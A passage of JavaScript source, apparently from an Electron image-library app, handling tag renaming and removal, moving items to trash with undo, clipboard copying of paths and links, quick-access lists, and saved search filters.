                                                    group.tags.splice(idx, 1);
                                                }
                                            }
                                        });
                                    }
                
                                    try {
                                        if (TagManager.historyTags && TagManager.historyTags.length > 0) {
                                            let idx = TagManager.historyTags.indexOf(tag.name);
                                            if (idx !== -1 && newName) {
                                                let nidx = TagManager.historyTags.indexOf(newName);
                                                if (nidx === -1) {
                                                    TagManager.historyTags[idx] = newName;
                                                    TagManager.historyTags = [...new Set(TagManager.historyTags)];
                                                }
                                                else {
                                                    TagManager.historyTags.splice(idx, 1);
                                                }
                                            }
                                        }
                                    } catch (err) {
                                        electronLog && electronLog.error(err.stack || err);
                                    }
                
                                    // 更新所有文件夹智能标签
                                    eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                                        if (folder && folder.tags) {
                                            let idx = folder.tags.indexOf(tag.name);
                                            if (idx !== -1 && newName) {
                                                folder.tags[idx] = newName;
                                                folder.tags = [...new Set(folder.tags)];
                                            }
                                        }
                                    });
                
                                    // 更新智能文件夹的标签属性
                                    eagle.utils.tree.walk($scope.smartFolders, 'children', function (smartFolder, parent, depth) {
                                        if (!smartFolder.conditions) return;
                                        smartFolder.conditions.forEach(function (condition) {
                                            if (!condition.rules) return;
                                            condition.rules.forEach(function (rule) {
                                                if (rule.property === 'tags') {
                                                    let ruleTags = rule.value;
                                                    if (ruleTags && ruleTags.length > 0) {
                                                        let idx = ruleTags.indexOf(tag.name);
                                                        if (idx !== -1 && newName) {
                                                            rule.value[idx] = newName;
                                                            rule.value = [...new Set(rule.value)];
                                                        }
                                                    }
                                                }
                                            });
                                        });
                                    });
                
                                    tag.name = newName;
                                    tag.pinyin = tinyPinyin.convertToPinyin(tag.name);
                
                                });
                
                                $scope.tagsSuggestion.push({
                                    value: newName,
                                    text: newName
                                });
                
                                if (changed.length > 0) {
                                    changed = [...new Set(changed)];
                                    ayncsImagesChange(changed);
                                }
                
                                $scope.selectedTags = {};
                                $scope.selectedTags[newName] = true;
                                
                                $scope.saveFolder();
                
                                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                                    $scope.rebindRefresh();
                                });
                
                                // 復原
                                $rootScope.notify({
                                    message: i18n.__("Dialog.MergeTags.Toast"),
                                    duration: 750,
                                });
                                
                            }, function() {});
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: selectedTags.length > 1,
                        role: 'separator'
                    },
                    // 删除標籤
                    {
                        label: i18n.__("Context.Tag.Remove.Title"),
                        keywords: 'delete remove 刪除 移除',
                        icon: 'ic-tag-delete.svg',
                        click: () => {
                            swal({
                                html: `
                                    <div class="alert">
                                        <div class="alert-icon warning"></div>
                                        <h4 class="alert-title">${i18n.__("Context.Tag.Remove.Title")}</h4>
                                        <p class="alert-desc">${i18n.__("Context.Tag.Remove.Descript") + '?'}</p>
                                    </div>
                                `,
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                customClass: "alert-box",
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("Context.Tag.Remove.Title"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function (newName) {
                    
                                electronLog && electronLog.info(`[app] Remove tag: [${tag.name}]`);
                    
                                let originImages = [];
                                // let originImagesTags = [];
                    
                                for (let rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                                    let image = $scope.raw[rindex];
                                    let originTagCount = image.tags.length;
                                    if (image && image.tags) {
                                        image.tags = image.tags.filter(function (tag) {
                                            // Note: 1.10 版本 IPTC bug，自動刪除異常關鍵字
                                            if (tag.length >= 500) { return false; }
                                            return !$scope.selectedTags[tag];
                                        });
                                        if (image.tags && image.tags.length != originTagCount) {
                                            originImages.push(image);
                                            // originImagesTags.push(angular.copy(image.tags));
                                        }
                                    }
                                }
                    
                                if (originImages.length > 0) {
                                    ayncsImagesChange(originImages);
                                    hiddenByCurrentFilter(originImages);
                                }
                    
                                // 更新所有文件夹智能标签
                                eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                                    if (folder && folder.tags) {
                                        let originTagCount = folder.tags.length;
                                        folder.tags = folder.tags.filter(function (tag) {
                                            return !$scope.selectedTags[tag];
                                        });
                                        if (folder.tags.length != originTagCount) {
                                        }
                                    }
                                });
                    
                                // 更新所有標籤群組
                                if (TagManager.groups.length > 0) {
                                    TagManager.groups.forEach(function (group) {
                                        if (group && group.tags) {
                                            group.tags = group.tags.filter(function (tag) {
                                                return !$scope.selectedTags[tag];
                                            });
                                        }
                                    });
                                }
                    
                                TagManager.starredTags = TagManager.starredTags.filter(function (tag) {
                                    return !$scope.selectedTags[tag];
                                });
                    
                                $scope.saveFolder();
                                TagManager.save();
                    
                                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                                    $scope.selectedTags = {};
                                    $scope.rebindRefresh();
                                    $scope.updateSelection();
                                });
                    
                                $scope.$evalAsync();
                    
                                if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteFolder == 'true') {
                                    $scope.removeSound.play();
                                }
                    
                            }, function() {});
                        }
                    }
                ],
                showSearch: true,
            });
        };

        var lastMoveToTrashCheckbox = 1;
        $scope.removeSelected = throttle(function removeSelected () {

            if ($rootScope.currentFocus == 'sidebar') {
                if ($rootScope.selectedFolders.length > 0) {
                    $scope.removeSelectedFolders();
                }
                else if ($rootScope.selectedSmartFolders.length > 0) {
                    $scope.removeSelectedSmartFolders();
                }
                else if ($scope.currentFolder) {
                    $scope.removeFolder($scope.currentFolder);
                } else if ($scope.currentSmartFolder) {
                    $scope.removeSmartFolder($scope.currentSmartFolder);
                }
            }
            else if ($rootScope.currentFocus == 'tags') {
                if ($scope.currentTagGroup) {
                    $scope.removeTagGroup($scope.currentTagGroup);
                }
            }
            else if ($scope.selectedFolderMappings && Object.keys($scope.selectedFolderMappings).length > 0) {
                var selectedFolders = Object.keys($scope.selectedFolderMappings).map(function(key) {
                    return key;
                });
                var folderId = selectedFolders[0];
                if (folderId && $scope.folderMappings[folderId]) {
                    $scope.removeFolder($scope.folderMappings[folderId], {
                        ignoreSelectNext: true
                    });
                }
            }
            else if ($scope.viewMode === 'alltags' && $scope.currentTagGroup) {
                var selectedTags = $scope.getSelectedTags();
                if (selectedTags && selectedTags.length > 0) {
                    TagManager.removeTagsFromGroup($scope.currentTagGroup.id, selectedTags);
                }
            }
            else {

                if ($scope.selected.length <= 0) return;

                if ($scope.viewMode == "trash") {
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${i18n.__('dialog.permanentlyDelay.title')}</h4>
                                <p class="alert-desc">${i18n.__("dialog.permanentlyDelay.desc")}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                        allowEnterKey: false,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__('dialog.permanentlyDelay.button'),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function () {
                        $scope.$evalAsync(function () {
                            $scope.removePermanently();
                        });
                    });
                }
                else {
                    $scope.checkOperationSafety(function () {
                        $scope.lastIndex = $scope.getSelection().start;

                        if ($scope.currentFolder) {

                            // 强制重置该文件夹及祖先封面
                            $scope.resetFolderCover($scope.currentFolder);
                            
                            var containsMultipleFolder = false;
                            for (var i = 0; i < $scope.selected.length; i++) {
                                var img = $scope.selected[i];
                                if (img && img.folders && img.folders.length > 1) {
                                    containsMultipleFolder = true;
                                    break;
                                }
                            }
                            if (containsMultipleFolder) {
                            	swal({
                                    html: `
                                        <div class="alert">
                                            <div class="alert-icon warning"></div>
                                            <h4 class="alert-title">${i18n.__("dialog.moveTrashWhenMultiCategory.title")}</h4>
                                            <p class="alert-desc">${i18n.__("dialog.moveTrashWhenMultiCategory.descript")}</p>
                                        </div>
                                    `,
                                    customClass: "alert-box check-multiple-categories-dialog",
                                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                    width: 400,
                                    cancelButtonColor: "#777777",
                                    input: 'radio',
                                    inputOptions: {
										'1': i18n.__("dialog.moveTrashWhenMultiCategory.checkbox"),
										'2': i18n.__("dialog.moveTrashWhenMultiCategory.button2"),
									},
                                    inputValue: lastMoveToTrashCheckbox, 
                                    inputValidator: function (result) {
                                        return new Promise(function (resolve, reject) {
                                            resolve(result);
                                        })
                                    },
                                    confirmButtonText: i18n.__("dialog.moveTrashWhenMultiCategory.button"),
                                    cancelButtonText: i18n.__("general.cancel"),
                                }).then(function (result) {
                                    var isForceToTrash = (result === '2');
                                    lastMoveToTrashCheckbox = result;
                                    $scope.removeFolderContents({isForceToTrash : isForceToTrash});
                                    $scope.$evalAsync();
                                }, function () {});
                            }
                            else {
                                $scope.removeFolderContents({isForceToTrash : true});
                            }
                        } else if ($scope.currentTag || $scope.currentSmartFolder || $scope.viewMode === 'all' || $scope.viewMode === 'unfiled' || $scope.viewMode === 'untagged' || $scope.viewMode === 'recent' || $scope.viewMode === 'random') {

                            var origin = [];
                            let now = Date.now();
                            $scope.selected.forEach(function(image) {
                                image.isDeleted = true;
                                image.deletedTime = Date.now();
                                origin.push(image);
                                $scope.updateFilterCounts(image, -1, now);
                            });

                            var message = $filter('i18n')("notify.image.remove", [
                                { "property": "count", "value": $scope.selected.length },
                            ]);
                            if ($scope.selected.length === 1) { message = message.replace("images", "image"); }

                            $rootScope.notify({
                                message: message,
                                duration: 4000,
                            }, function() {
                                let now = Date.now();
                                origin.forEach(function(image) {
                                    image.isDeleted = false;
                                    delete image.deletedTime;
                                    $scope.updateFilterCounts(image, 1, now);
                                });
                                $scope.selected = origin;
                                if ($scope.isDetailMode) {
                                    $scope.current = origin[0];
                                }
                                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                                    if (
                                        $scope.viewMode !== 'random'
                                    ) {
                                        $scope.rebindRefresh();    
                                    }
                                    ScrollbarSaver.restoreScrollPosition();
                                });
                                ayncsImagesChange(origin);
                                hiddenByCurrentFilter(origin);
                            });

                            if ($scope.isDetailMode) {
                                $timeout(function() {
                                    $scope.zoom();
                                }, 100)
                            }

                            if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteImage == 'true') {
                                $scope.removeSound.play();
                            }
                            ayncsImagesChange($scope.selected);
                            hiddenByCurrentFilter($scope.selected);

                            // 自動選取下一個圖片，如果沒有下一個，選上一個，都沒有就空
                            $scope.lastIndex = $scope.getSelection().start;
                            var next = $scope.allData[$scope.lastIndex + $scope.selected.length];
                            var prev = $scope.allData[$scope.lastIndex - 1];
                            
                            if (next) {
                                $scope.selected = [next];
                                if ($scope.isDetailMode) {
                                    $scope.current = next;
                                }
                            } else if (prev) {
                                $scope.selected = [prev];
                                if ($scope.isDetailMode) {
                                    $scope.current = prev;
                                }
                            } else {
                                $scope.selected = [];
                                if ($scope.isDetailMode) {
                                    $scope.leaveDetailMode();
                                }
                            }

                            $timeout(function() {
                            	$scope.forceFitImageSize($scope.current);
			                    $scope.zoom();
				            }, 100);
                            
                            ScrollbarSaver.saveScrollPosition();

                            var itemElements = $scope.getSelectedItemElements();
                            $rootScope.$broadcast("gl:removeItems", itemElements);

                            $scope.lastSelectedIndex = $scope.currentIndex() - 1;
                            autoScroll();

                            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                                if (
                                    $scope.viewMode !== 'random' ||
                                    ($scope.currentFolder && $scope.currentFolder.orderBy !== "RANDOM")
                                ) {
                                    $scope.rebindRefresh(true);
                                }
                                $scope.updateSelection();
                                if ($scope.currentFolder) { electronLog && electronLog.info(`[app] Remove ${itemElements.length} files from ${$scope.currentFolder.name}(${$scope.currentFolder.id}), folder remain ${$scope.currentFolder.imageCount} files, all remain ${$scope.all.length} files, trash remain ${$scope.trash.length} files`); }
                                else { electronLog && electronLog.info(`[app] Remove ${itemElements.length} files, all remain ${$scope.all.length} files, trash remain ${$scope.trash.length} files`); }
                            });
                        } else {
                            return;
                        }
                    }, 200);
                }
            }
        }, 300, true);

        $scope.removeFolderContents = function (params) {
    
            var origin = [];
            var originFolders = [];
            var isForceToTrash = params.isForceToTrash;
            let now = Date.now();
            $scope.selected.forEach(function(image) {
                origin.push(image);
                originFolders.push(angular.copy(image.folders));
                $scope.currentFolder.imagesMappings[image.id] = false;
                if ($scope.currentFolder.parent) {
                    if ($scope.folderMappings[$scope.currentFolder.parent].imagesMappings) {
                        $scope.folderMappings[$scope.currentFolder.parent].imagesMappings[image.id] = false;
                    }
                }

                // 遍歷所有子資料夾，移除子資料夾也出現這張圖的索引
                if ($scope.currentFolder.children) {
                    $scope.currentFolder.children.forEach(function(child) {
                        child.imagesMappings[image.id] = false;
                    });
                }

                // 如果图片包含多个文件夹
                if (!isForceToTrash && image.folders && image.folders.length > 1) {
                    var idx = image.folders.indexOf($scope.currentFolder.id);
                    if (idx > -1) {
                        image.folders.splice(idx, 1);
                    }
                }
                else {
                    image.isDeleted = true;
                    image.deletedTime = now;
                }
                $scope.updateFilterCounts(image, -1, now);
            });

            autoScroll();

            if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteImage == 'true') {
                $scope.removeSound.play();
            }

            var message = $filter('i18n')("notify.image.remove", [
                { "property": "count", "value": $scope.selected.length },
            ]);
            if ($scope.selected.length === 1) { message = message.replace("images", "image"); }

            $rootScope.notify({
                message: message,
                duration: 4000,
            }, function() {
                let now = Date.now();
                origin.forEach(function(image, index) {
                    image.isDeleted = false;
                    image.folders = originFolders[index];
                    delete image.deletedTime;
                    $scope.updateFilterCounts(image, 1, now);
                });
                $scope.selected = origin;
                if ($scope.isDetailMode) {
                    $scope.current = origin[0];
                }
                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                    $scope.rebindRefresh();
                    ScrollbarSaver.restoreScrollPosition();
                });
                $scope.zoom();
                ayncsImagesChange(origin);
            });

            ayncsImagesChange($scope.selected);
            hiddenByCurrentFilter($scope.selected);

            // 自動選取下一個圖片，如果沒有下一個，選上一個，都沒有就空
            $scope.lastIndex = $scope.getSelection().start;
            var next = $scope.allData[$scope.lastIndex + $scope.selected.length];
            var prev = $scope.allData[$scope.lastIndex - 1];
            if (next) {
                $scope.selected = [next];
                if ($scope.isDetailMode) {
                    $scope.current = next;
                }
            } else if (prev) {
                $scope.selected = [prev];
                if ($scope.isDetailMode) {
                    $scope.current = prev;
                }
            } else {
                $scope.selected = [];
                $scope.leaveDetailMode();
            }
            $timeout(function() {
            	$scope.forceFitImageSize($scope.current);
                $scope.zoom();
            }, 100);
            ScrollbarSaver.saveScrollPosition();

            var itemElements = $scope.getSelectedItemElements();
            $rootScope.$broadcast("gl:removeItems", itemElements);

            autoScroll();

            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                if ($scope.currentFolder && $scope.currentFolder.orderBy === "RANDOM") {}
                else {
                    $scope.rebindRefresh(true);
                }
                $scope.updateSelection();
                if ($scope.currentFolder) { electronLog && electronLog.info(`[app] Remove ${itemElements.length} files from ${$scope.currentFolder.name}(${$scope.currentFolder.id}), folder remain ${$scope.currentFolder.imageCount} files, all remain ${$scope.all.length} files, trash remain ${$scope.trash.length} files`); }
                else { electronLog && electronLog.info(`[app] Remove ${itemElements.length} files, all remain ${$scope.all.length} files, trash remain ${$scope.trash.length} files`); }
            });
        };

        var cleanSelectedTimeout;
        $scope.cleanSelected = function(event) {
            // 忽略事件传送
            if (event && $("#box-container").outerWidth() <= event.offsetX + 10) {
                event.stopPropagation();
                return;
            }

            // event && event.stopPropagation();
            if (event.metaKey || event.shiftKey || event.ctrlKey) return;
            cleanSelectedTimeout = $timeout(function() {
                $scope.selected = [];
                $scope.selectedFolderMappings = {};
                $scope.updateSelection();
            }, 100);
        };

        $scope.copyAsPath = function (event) {
            if (!$scope.selected || !$scope.selected[0]) return;
            let copyText = "";
            $scope.selected.forEach(function (item, index) {
                var folderPath = path.normalize($scope.libraryPath + "/images/" + item.id + ".info/");
                var rawPath = path.normalize(folderPath + item.name + "." + item.ext);
                if (index == 0) {
                    copyText += rawPath;
                }
                else {
                    copyText += `\n${rawPath}`;
                }
            });
            clipboard.writeText(copyText);
            $scope.notify({
                message: $filter('i18n')("notify.copyPath.successMsg"),
                duration: 750
            });
        };

        $scope.copyAsProperity = function (properity) {
            if (!$scope.selected || !$scope.selected[0]) return;
            let copyText = "";
            $scope.selected.forEach(function (item, index) {
                if (index == 0) {
                    copyText += `${item[properity] || ""}`;
                }
                else {
                    copyText += `\n${item[properity] || ""}`;
                }
            });
            clipboard.writeText(copyText);
            $scope.notify({
                message: $filter('i18n')("notify.copyPath.successMsg"),
                duration: 750
            });
        };

        $scope.copyAsFolderPath = function (event) {
            if (!$scope.selected || !$scope.selected[0]) return;
            let copyText = "";
            $scope.selected.forEach(function (item, index) {
                var folderPath = path.normalize($scope.libraryPath + "/images/" + item.id + ".info/");
                if (index == 0) {
                    copyText += folderPath;
                }
                else {
                    copyText += `\n${folderPath}`;
                }
            });
            clipboard.writeText(copyText);
            $scope.notify({
                message: $filter('i18n')("notify.copyPath.successMsg"),
                duration: 750
            });
        };

        $scope.copyAsLink = function (event, items) {
            if (!items || !items[0]) return;
            let text = ``;
            items.forEach(function (item, index) {
                if (item && item.id) {
                    text += `eagle://item/${item.id}`;
                    if (index !== items.length - 1) {
                        text += "\n";
                    }
                }
            });

            clipboard.writeText(text);
            $scope.notify({
                message: i18n.__("notify.colorCopySuccess"),
                duration: 750
            });
        }

        $scope.copyAsThumbnail = function () {
            ipcRenderer.sendTo(backgroundWindowID, 'copy-thumbnails', $scope.selected);
            setTimeout(function () {
                $scope.notify({
                    message: $filter('i18n')("previewWindow.copied"),
                    duration: 1000
                });
            }, 150);
        };

        $scope.copyAsBase64 = function () {
            let item = $scope.selected[0];
            let folderPath = path.normalize($scope.libraryPath + "/images/" + item.id + ".info/");
            let rawPath = path.normalize(`${folderPath}${item.name}.${item.ext}`);
            let thumbPath = path.normalize(`${folderPath}${item.name}_thumbnail.png`);
            let imageType = { jpg: true, jfif: true, insp: true, png: true, webp: true, gif: true };
            let ext2type = { "gif": "gif", "jpg": "jpeg", "png": "png", "jpeg": "jpeg", "jfif": "jpeg", "jpe": "jpeg", "insp": "jpeg", "webp": "webp" };
            let type;
            let base64;

            try {
                if (imageType[item.ext]) {
                    type = ext2type[item.ext];
                    base64 = fs.readFileSync(rawPath, 'base64');
                }
                else {
                    type = "webp";
                    base64 = fs.readFileSync(thumbPath, 'base64');
                }
                
                clipboard.writeText(`data:image/${type};base64,${base64}`);
                $scope.notify({
                    message: $filter('i18n')("previewWindow.copied"),
                    duration: 1000
                });
            }
            catch (err) {
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.copyItemLink = function (event, item) {
            if (item && item.id) {
                clipboard.writeText(`eagle://item/${item.id}`);
                $scope.notify({
                message: i18n.__("notify.colorCopySuccess"),
                    duration: 750
                });
            }
        };

        $scope.copyFolderLink = function (event, folder) {
            if (folder && folder.id) {
                clipboard.writeText(`eagle://folder/${folder.id}`);
                $scope.notify({
                message: i18n.__("notify.colorCopySuccess"),
                    duration: 750
                });
            }
        };

        $scope.copySmartFolderLink = function (event, smartFolder) {
            if (smartFolder && smartFolder.id) {
                clipboard.writeText(`eagle://smart-folder/${smartFolder.id}`);
                $scope.notify({
                message: i18n.__("notify.colorCopySuccess"),
                    duration: 750
                });
            }
        };

        $scope.selectAll = function(event) {
            event && event.stopPropagation();
            if ($scope.viewMode == 'alltags') {
                $scope.selectedTags = {};
                $scope.TagManager.tagsResult.tags.forEach((tagName) => {
                    $scope.selectedTags[tagName] = true;
                });
            }
            else {
                var selected = [];
                Array.prototype.push.apply(selected, $scope.allData);
                $scope.selected = selected;
                $scope.selectedMappings = {};
                $timeout.cancel(cleanSelectedTimeout);
                $rootScope.currentFocus = "content";
            }
        };

        $scope.smartFolderCount = function (smartFolder) {
            if (smartFolder) {

            	if (smartFolder.conditions.length === 0) return 0;
                // console.time("计算智能文件夹图片数量");
                var images = [];
                images = $scope.raw.filter(function (image) {
                    if (image.isDeleted) return false;
                    return $scope.existInSmartFilter(smartFolder, image);
                });
                if (Object.keys($scope.lockedImages).length > 0) {
                    images = images.filter($scope.lockImageFilter);
                }
                // console.timeEnd("计算智能文件夹图片数量");
                return images.length;
            }
        };

        $scope.QuickAccessManager = QuickAccessManager;
        // Quick Access 管理工具
        QuickAccessManager.add = function (type, object) {
            $scope.quickAccess.push({
                type: type,
                id: object.id
            });
            $scope.updateSidebarList();
            QuickAccessManager.save();
            electronLog.info(`[app] Add ${type}(${object.id}) to quick access`);
            analytics.event('QuickAccess', 'Add', type);
        };

        QuickAccessManager.addMultiple = function (type, objects) {
            if (!objects) return;
            objects.forEach(function (object) {
                if (QuickAccessManager.indexOf(object) === -1) {
                    $scope.quickAccess.push({
                        type: type,
                        id: object.id
                    });
                    electronLog.info(`[app] Add ${type}(${object.id}) to quick access`);
                    analytics.event('QuickAccess', 'Add', type);
                }
            });
            $scope.updateSidebarList();
            QuickAccessManager.save();
        };

        QuickAccessManager.remove = function (type, object) {
            var idx = QuickAccessManager.indexOf(object);
            if (idx > -1) {
                $scope.quickAccess.splice(idx, 1);
                $scope.updateSidebarList();
                QuickAccessManager.save();
                electronLog.info(`[app] Remove ${type}(${object.id}) from quick access`);
                analytics.event('QuickAccess', 'Remove', type);
            }
        };

        QuickAccessManager.removeMultiple = function (type, objects) {
            if (!objects) return;
            objects.forEach(function (object) {
                var idx = QuickAccessManager.indexOf(object);
                if (idx > -1) {
                    $scope.quickAccess.splice(idx, 1);
                    electronLog.info(`[app] Remove ${type}(${object.id}) from quick access`);
                    analytics.event('QuickAccess', 'Remove', type);
                }
            });
            $scope.updateSidebarList();
            QuickAccessManager.save();
        };

        QuickAccessManager.removeIndex = function (idx) {
            if (idx > -1) {
                var object = $scope.quickAccess[idx];
                $scope.quickAccess.splice(idx, 1);
                $scope.updateSidebarList();
                QuickAccessManager.save();
                electronLog.info(`[app] Remove ${object.type}(${object.id}) from quick access`);
                analytics.event('QuickAccess', 'Remove', object.type);
            }
        };

        QuickAccessManager.save = function () {
            $scope.saveFolder();
        };

        QuickAccessManager.indexOf = function (object) {
            var arr = $scope.quickAccess;
            for (var i = 0; i < arr.length; i++) {
                if (object.id === arr[i].id) {
                    return i;
                }
            }
            return -1;
        }

        QuickAccessManager.getItem = function (type, id) {
            switch (type) {
                case "folder":
                    return $scope.folderMappings[id];
                    break;
                case "smartFolder":
                    return $scope.smartFolderMappings[id];
                    break;
            }
        };

        ScrollbarSaver = {
            positionMapping: {},
            getId: function () {
                var id;
                if ($scope.currentFolder) { id = $scope.currentFolder.id; }
                else if ($scope.currentSmartFolder) { id = $scope.currentSmartFolder.id; }
                else if ($scope.viewMode == "all") { id = "all"; }
                else if ($scope.viewMode == "unfiled") { id = "unfiled"; }
                else if ($scope.viewMode == "untagged") { id = "untagged"; }
                else if ($scope.viewMode == "trash") { id = "trash"; }
                else if ($scope.viewMode == "random") { id = "random"; }
                else if ($scope.viewMode == "recent") { id = "recent"; }
                return id;
            },
            saveScrollPosition: function () {
                if (eagle.filter.filterBadge > 0) return;
                if ($scope.keyword) return;
                if ($(".box").length + $(".sub-folder").length === 0) return;
                var scrollTop = $("#box-container").scrollTop();
                var obj = {};
                var id = ScrollbarSaver.getId();

                if (scrollTop === 0) {
                    delete ScrollbarSaver.positionMapping[id];
                    return;
                }

                var startCursor = 0;
                var offsetTop = ($(".box-list")[0] && $(".box-list")[0].offsetTop) || 0;
                var scrollOffset;
                if ($(".sub-folder").length > 0 && $scope.startCursor === 0) {
                    scrollOffset = $("#box-container").scrollTop();
                }
                else {
                    if ($(".box").length === 0) return;
                    scrollOffset = Math.abs($(".box").eq(0).offset().top - 44) + offsetTop;
                }
                var its = ig.getItems();
                if (its[0]) { startCursor = its[0].groupKey - 1000000; }

                if (!id) return;

                if (startCursor) { obj.cursor = startCursor; }
                obj.offset = scrollOffset;
                ScrollbarSaver.positionMapping[id] = obj;
            },
            restoreScrollPosition: function () {
                
                if ($scope.viewMode === 'random') return;
                if (eagle.filter.filterBadge > 0) return;
                var id = ScrollbarSaver.getId();

                if (!id) return;

                clearTimeout(showImagesTimeout2);
                var obj = ScrollbarSaver.positionMapping[id];
                var $boxContainer = $("#box-container");
                if (obj) {
                    $scope.startCursor = obj.cursor || 0;
                    var offset = obj.offset || 0;
                    var times = [20, 300];
                    for (var i = times[0]; i < times[1]; i+=20) {
                        setTimeout(function () { 
                            if (ScrollbarSaver.getId() !== id || $boxContainer.scrollTop() !== offset) {
                                clearTimeout(showImagesTimeout2);
                                $boxContainer.scrollTop(offset); 
                            }
                        }, i);
                    }
                }
                else {
                    $scope.startCursor = 0;
                }
            }
        };

        $scope.SavedFilter = {
            jsonPath: "",
            filters: [],
            init: function (rootDir, callback) {
                try {
                    var jsonPath = path.normalize(rootDir + "/saved-filters.json");
                    if (!fs.existsSync(jsonPath)) {
                        writeFileAtomic(jsonPath, JSON.stringify([]), function () {
                            var json = fs.readFileSync(jsonPath, 'utf8');
                            var data = JSON.parse(json);
                            $scope.SavedFilter.filters = data;
                            callback && callback();
                        });
                    }
                    else {
                        var json = fs.readFileSync(jsonPath, 'utf8');
                        var data = JSON.parse(json);
                        $scope.SavedFilter.filters = data;
                        callback && callback();
                    }
                    $scope.SavedFilter.jsonPath = jsonPath;
                }
                catch (err) {
                    $scope.SavedFilter.jsonPath = jsonPath;
                    $scope.SavedFilter.filters = [];
                    electronLog && electronLog.error(err.stack || err);
                    callback && callback();
                }
                // 監聽檔案修改
                $scope.SavedFilter.watch();
            },
            watch: function () {
                try {
                    if (fs.existsSync($scope.SavedFilter.jsonPath)) {
                        fs.watchFile($scope.SavedFilter.jsonPath, { persistent: true, interval: 4000 }, function(curr, prev) {
                            if (curr.mtimeMs === prev.mtimeMs) return;
                            if (!fs.existsSync($scope.SavedFilter.jsonPath)) return;
                            electronLog.info(`[app] The saved-filter.json file is detected to be modified.`);
                            $scope.SavedFilter.unwatch();
                            $scope.SavedFilter.init($scope.libraryPath, function () {});
                        });
                    }
                }
                catch (err) {}
            },
            unwatch: function () {
                try {
                    if (fs.existsSync($scope.SavedFilter.jsonPath)) {
                        fs.unwatchFile($scope.SavedFilter.jsonPath);
                    }
                }
                catch (err) {}
            },
            save: function () {
                electronLog.info(`[app] Saving Saved Filter to ${$scope.SavedFilter.jsonPath}`);
                try {
                    $scope.SavedFilter.unwatch();
                    let data = $scope.SavedFilter.filters;
                    writeFileAtomic($scope.SavedFilter.jsonPath, JSON.stringify(data), function () {
                        $scope.SavedFilter.watch();
                    });
                }
                catch (err) {
                    electronLog && electronLog.error(err.stack || err);
                }
            },
            create: function () {
                if (eagle.filter.filterBadge === 0 && !$scope.keyword) return;
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon filter"></div>
                            <h4 class="alert-title">${i18n.__("savedFilter.createBtn")}</h4>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    input: 'text',
                    inputValue: '',
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("savedFilter.save"),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function (result) {
                    if (result.length === 0) return;
                    let rule = angular.copy(eagle.filter.filterRules);
                    let keyword = $scope.keyword;
                    if (keyword?.length > 0) {
                        rule.keyword = keyword;
                    }
                    let filter = {
                        name: result,
                        rule: rule
                    }
                    $scope.SavedFilter.init($scope.libraryPath, function () {
                        $scope.SavedFilter.filters.push(filter);
                        $scope.SavedFilter.save();
                        $scope.$evalAsync();
                    });
                }, function () {});
            },
            edit: function (filter) {
                swal({
                    title: i18n.__("savedFilter.rename"),
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    input: 'text',
                    inputValue: filter.name,
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("savedFilter.rename"),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function (result) {
                    if (result.length === 0) return;
                    filter.name = result;
                    $scope.SavedFilter.save();
                    $scope.$evalAsync();
                }, function () {});
            },
            delete: function (filter) {
                let idx = $scope.SavedFilter.filters.indexOf(filter);
                if (idx > -1) {
                    $scope.SavedFilter.filters.splice(idx, 1);
                    $scope.SavedFilter.save();
                    $scope.$evalAsync();
                }
            },
            toggle: function (event) {
                event && event.stopPropagation();
                $("[filter-item].open").removeClass("open");

                let showSearch = false;
                let persistents = [{
                    disabled: eagle.filter.filterBadge === 0 && !$scope.keyword,
                    label: i18n.__('savedFilter.createBtn'),
                    icon: 'ic-saved-filter-create.svg',
                    click: (item) => {
                        $scope.SavedFilter.create();
                    },
                }];
                let filterItemMap = new WeakMap();
                let items = $scope.SavedFilter.filters.map((filter) => {
                    let item = {
                        label: filter.name,
                        icon: 'ic-saved-filter-apply.svg',
                        click: (item) => {
                            $scope.SavedFilter.apply(filter.rule);
                        },
                        more: (item) => {
                            const contextMenu = new Menu();
                            contextMenu.append(new MenuItem({
                                label: i18n.__("savedFilter.rename"),
                                click: () => {
                                    $scope.SavedFilter.edit(filter);
                                    ContextMenu.close();
                                    $scope.$evalAsync();
                                }
                            }));
                            contextMenu.append(new MenuItem({
                                label: i18n.__("savedFilter.remove"),
                                click: () => {
                                    $scope.SavedFilter.delete(filter);
                                    ContextMenu.close();
                                    $scope.$evalAsync();
                                }
                            }));
                            contextMenu.popup(currentWindow);
                        }
                    }
                    filterItemMap.set(filter, item);
                    return item;
                });

                if (items.length > 0) {
